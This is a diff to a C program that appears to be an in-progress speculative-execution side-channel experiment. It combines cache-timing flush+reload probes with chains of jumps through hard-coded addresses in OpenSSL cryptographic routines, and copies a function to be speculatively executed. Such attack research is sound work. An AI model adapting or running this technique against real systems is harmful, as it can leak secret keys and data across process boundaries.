@@ -76,7 +76,40 @@ void push(uint64_t val) {
 uint64_t loaded_pages[MAX_PAGES];
 int loaded_pages_idx = 0;
 jump jump_addrs[NUM_JUMPS] = {
-        // in openssl-accept.repeats2: 254 repeats (line 14491502):
+        /*
+        {0x7ffff785a926, 0x7ffff785c261}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c277}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c28f}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c2a2}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785c2b5}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c2cd}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c2e3}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c2f3}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785ac1d}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785ac28}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785ac36}, //  retq   
+        {0x7ffff785ac40, 0x7ffff785c3c5}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c3d0}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c3e3}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c3f3}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c3ff}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c4b7}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c4c9}, //  retq   
+        {0x7ffff785a27e, 0x7ffff785c538}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c543}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c54e}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c55e}, //  retq   
+        {0x7ffff785a34a, 0x7ffff785c569}, //  retq   
+        {0x7ffff785a41a, 0x7ffff785c61d}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c628}, //  retq   
+        {0x7ffff785abfc, 0x7ffff785c638}, //  retq   
+        {0x7ffff785a926, 0x7ffff785c645}, //  retq   
+        {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
+        {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
+        {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
+        {0x7ffff785a74b, 0x7ffff785c22a}, //  retq   
+        */
+        // in openssl-accept.repeats2}, //254 repeats (line 14491502):
         // part of EC_GFp_nistp224_method()
         {0x7ffff785a74b, 0x7ffff785c256}, //  retq   
         {0x7ffff785a926, 0x7ffff785c261}, //  retq   
@@ -109,6 +142,7 @@ jump jump_addrs[NUM_JUMPS] = {
         {0x7ffff785a5f0, 0x7ffff785c798}, //  retq   
         {0x7ffff785ae37, 0x7ffff785c847}, //  retq   
         {0x7ffff785c858, 0x7ffff785ea59}, //  retq   
+        //*/
         /*
         // CAMELLIA256-SHA / EVP_MD_CTX_init...
         {0x7ffff780d32d, 0x7ffff780d3ff}, //  retq   
@@ -198,17 +232,18 @@ void check_probes() {
     uint64_t t0, t1;
     uint8_t *addr;
 
-    int i;
+    int i, mix_i;
     for (i=0; i<NUM_PROBES; i++) {
-        addr = &probe_buf[i*cur_probe_space];
+        mix_i = ((i*167) + 13) & 255;
+        addr = &probe_buf[mix_i*cur_probe_space];
         t0 = _rdtscp(&junk);
         asm volatile( "movb (%%rbx), %%al\n"
             :: "b"(addr) : "rax");
         t1 = _rdtscp(&junk);
-        if (t1-t0 < 140) {
+        if (t1-t0 < 150) {
             cache_hits++;
             tot_time += t1-t0;
-            results[i]++;
+            results[mix_i]++;
             //printf("# %lu\n", t1-t0);
             //_mm_clflush(addr);
         }
@@ -222,7 +257,14 @@ void check_probes() {
     //usleep(100);
 }
 
+
+typedef void (*fn_ptr_t)(void);
+
 uint64_t jmp_ptr;
+fn_ptr_t *fn_ptr_ptr;   // This is a pointer that when dereferenced
+                    // will yield a void (*)(void) that points to check_probes.
+                    // Now we can move this around (malloc each time)
+
 
 
 
@@ -256,19 +298,76 @@ void indirect_camellia(register uint64_t *jmp_ptr) {
         asm volatile ("push %%rax\n" :: "a"(jump_addrs[i].to):);
     }
 
+    /*
+    asm volatile ("mov $2, %%rax\n"
+                "cmpb $0x02, %%al\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n"
+                "je .+2\n" ::: "rax");
+                */
+
     // Do something slow to stall the pipeline???
     // Call the first thing in the jump chain
     //call((void (*)(void))jump_addrs[0].from);
+    /*
     asm volatile ("add (%%rcx), %%rax\n"
             "jmpq *%%rax\n" :: "a"(jump_addrs[0].from), "c"(jmp_ptr):);
+            */
 
+    asm volatile ("jmpq *%%rax\n" :: "a"(jump_addrs[0].from):);
 
 done_jumps:
+    asm volatile ("add (%%rcx), %%rax\n" :: "c"(jmp_ptr));
     (*fn_ptr)();
+    //t0 = _rdtscp(&junk);
+    //fn_ptr = *fn_ptr_ptr;
+    //t1 = _rdtscp(&junk);
+    //printf("%d\n", t1-t0);
+    //(**fn_ptr_ptr)();
+    //(*(void(*)(void))(jump_addrs[NUM_JUMPS-1].to))();
 }
 
 
 void (*fn_ptr)(void);
+
 
 void measure() {
     fn_ptr = check_probes;
@@ -276,19 +375,22 @@ void measure() {
     jmp_ptr = 0;
     int i;
 
+
     int misses = 0;
     uint64_t last_i = 0xff;
 
     while (1) {
         for (i=0; i<15000; i++) {
+            //_mm_clflush(fn_ptr);
             _mm_clflush(&fn_ptr);
             _mm_clflush(&jmp_ptr);
-            //indirect(&jmp_ptr);
+            /*
+            fn_ptr_ptr = malloc(sizeof(void*));
+            *fn_ptr_ptr = check_probes;
+            _mm_clflush(fn_ptr_ptr);
+            */
             indirect_camellia(&jmp_ptr);
-            //((void(*)(void *))map)(&jmp_ptr);
-            //if ((i % 3)==0) {
-                usleep(10);
-            //}
+            usleep(10);
         }
         uint64_t avg = 0;
         if (cache_hits > 0) avg = tot_time/cache_hits;
@@ -323,7 +425,11 @@ void measure() {
             }
 
         } else {
-             printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
+            printf("--[%lu]: %lu, %lu avg cycles ps %ld, 13 had: %lu, %lu tot hits\n", max_i, max_res, avg, cur_probe_space, results[13], cache_hits);
+            /*
+            for (i=0; i<NUM_PROBES; i++) {
+                printf("  %d: %d\n", i, results[i]);
+            }*/
             misses++;
             cur_probe_space += 63;
             cur_probe_space %= MAX_PROBE_SPACE;
@@ -355,11 +461,19 @@ int main()
         _mm_clflush(&probe_buf[i*cur_probe_space]);
     }
 
-   // Setup of OpenSSL Camellia EVP_MD_CTX_init jumps
+    // Setup of OpenSSL Camellia EVP_MD_CTX_init jumps
+    uint64_t target = jump_addrs[NUM_JUMPS-1].to;
+    uint64_t min_diff = jump_addrs[0].to - target;
+
     memset(loaded_pages, 0, sizeof(uint64_t)*MAX_PAGES);
     for (i=0; i<NUM_JUMPS-1; i++) {
         load_page(jump_addrs[i].from);
         load_page(jump_addrs[i].to);
+
+        uint64_t target_diff = jump_addrs[i].to - target;
+        if (target_diff < min_diff) {
+            min_diff = target_diff;
+        }
 
         // Write the jump from this .to to  the next .from
         // get difference - 5 (len(jmpq $xxxx) instruction)
@@ -380,13 +494,11 @@ int main()
 
 
     load_page(jump_addrs[NUM_JUMPS-1].to);
-    printf("Copying 0x%x bytes to 0x%08x...\n", end_target_fn-target_fn,
-            (uint64_t)jump_addrs[NUM_JUMPS-1].to);
+    printf("Copying 0x%lx bytes to 0x%08lx...we have 0x%lx bytes of head space\n", end_target_fn-target_fn,
+            (uint64_t)jump_addrs[NUM_JUMPS-1].to, min_diff);
     // Copy the target_fn code into the last jump_addrs[NUM_JUMPS-1].to
     // This will hopefully be speculatively called...
     memcpy((void*)jump_addrs[NUM_JUMPS-1].to, target_fn, end_target_fn-target_fn);
-
-    printf("bye\n");
 
 
     /*
